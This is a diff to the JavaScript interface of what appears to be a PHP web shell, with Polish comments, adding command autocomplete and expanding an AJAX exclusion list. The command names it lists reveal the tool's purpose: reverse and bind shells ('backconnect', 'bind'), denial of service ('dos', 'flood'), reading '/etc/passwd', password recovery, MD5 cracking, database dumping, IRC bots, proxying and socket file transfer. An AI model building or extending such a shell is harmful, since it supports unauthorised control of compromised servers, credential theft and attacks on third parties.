@@ -1,5 +1,8 @@
 <script src="http://code.jquery.com/jquery-1.6.3.min.js"></script>
 <script>
+/**
+ * Lista polecen, ktorych nie nalezy uzywac z AJAX
+ */
 var aExclude = new Array
 (
 	'edit',
@@ -7,9 +10,102 @@ var aExclude = new Array
 	'down',
 	'download',
 	'get',
-	'logout'
+	'logout',
+	'bind',
+	'mysqldump',
+	'mysqldumper',
+	'mysqlbackup',
+	'passwordrecovery',
+	'pr',
+	'dos',
+	'flood',
+	'backconnect',
+	'bc',
+	'irc',
+	'proxy'
 );
 
+/**
+ * Podpowiedi - lista wszystkich dostepnych polecen
+ */
+var aCommands = new Array
+(
+	'help',
+	'modules',
+	'edit',
+	'upload',
+	'system',
+	'exec',
+	'info',
+	'mysql',
+	'cd',
+	'bind',
+	'pwd',
+	'remove',
+	'rm',
+	'delete',
+	'del',
+	'pack',
+	'unpack',
+	'exit',
+	'mysqldump',
+	'mysqldumper',
+	'mysqlbackup',
+	'ftpdownload',
+	'ftpdown',
+	'ftpget',
+	'mv',
+	'move',
+	'passwordrecovery',
+	'pr',
+	'logout',
+	'ftpupload',
+	'ftpup',
+	'ftpput',
+	'eval',
+	'php',
+	'dos',
+	'flood',
+	'g4m3',
+	'hexdump',
+	'hd',
+	'cat',
+	'backconnect',
+	'bc',
+	'socketupload',
+	'socketup',
+	'socketput',
+	'cp',
+	'copy',
+	'echo',
+	'chmod',
+	'mail',
+	'email',
+	'sendmail',
+	'mkdir',
+	'download',
+	'down',
+	'get',
+	'bcat',
+	'b64',
+	'etcpasswd',
+	'revip',
+	'socketdownload',
+	'socketdown',
+	'socketget',
+	'md5crack',
+	'irc',
+	'ping',
+	'ls',
+	'proxy',
+	'phpinfo',
+	'destroy',
+	'removeshell'
+);
+
+/**
+ * Sprawdzanie czy polecenie nie moze zostac uzyte z AJAX
+ */
 function isExclude( sCmd )
 {
 	for( i = 0; i < aExclude.length; ++i )
@@ -23,8 +119,67 @@ function isExclude( sCmd )
 	return true;
 }
 
+/**
+ * Podpowiedzi
+ */
+function autoPrompt( sCommand )
+{
+	var sOutput = '';
+
+	aParametrs = sCommand.split( ' ' );
+	sCommand = aParametrs[0].trim();
+
+	if( sCommand != '' )
+	{
+		for( i in aCommands )
+		{
+			if( aCommands[ i ].substring( 0, sCommand.length ) == sCommand )
+			{
+				sOutput += '<span title="' + aCommands[ i ] + '">';
+
+				/**
+				 * Wyroznienie szukanej frazy kolorem czerwonym
+				 */
+				sOutput += '<span class="red">';
+				sOutput += aCommands[ i ].substring( 0, sCommand.length );
+				sOutput += '</span>';
+
+				sOutput += aCommands[ i ].substring( sCommand.length );
+				sOutput += '</span>,&nbsp;';
+			}
+		}
+	}
+
+	if( sOutput == '' )
+	{
+		sOutput = '<em>Brak</em>';
+	}
+
+	$( 'div#prompt' ).html( '<strong>Dostępne polecenia:</strong> ' + sOutput );
+
+	/**
+	 * Po kliknieciu
+	 */
+	$( 'div#prompt > span' )
+		.mouseover( function()
+			{
+				$( this ).css( 'cursor', 'pointer' );
+			}
+		)
+		.click( function()
+		{
+			$( 'input#cmd' ).val( ':' + $( this ).attr( 'title' ) + ' ' );
+
+			autoPrompt( $( this ).attr( 'title' ) );
+		}
+	);
+}
+
 $(function()
 	{
+		/**
+		 * Okno ze statusem
+		 */
 		$( 'div#body' ).after( '<div id="status">&nbsp;</div>' );
 		$( 'div#status' ).hide();
 
@@ -43,6 +198,26 @@ $(function()
 					);
 					return false;
 				}
+			}
+		);
+
+		/**
+		 * Automatyczne podpowiedzi
+		 */
+		$( 'form' ).after( '<br /><div id="prompt" style="text-align: left; padding-left: 25px"><strong>Dostępne polecenia:</strong> <em>Brak</em></div>' );
+		$( 'input#cmd' ).keyup( function( oKey )
+			{
+				var sOutput = '';
+
+				if( ( $( this ).val().length > 1 ) && ( $( this ).val().substring( 0, 1 ) == ':' ) )
+				{
+					autoPrompt( $( this ).val().substring( 1 ) );
+				}
+				else
+				{
+					$( 'div#prompt' ).html( '<strong>Dostępne polecenia:</strong> <em>Brak</em>' );
+				}
+
 			}
 		);
 	}
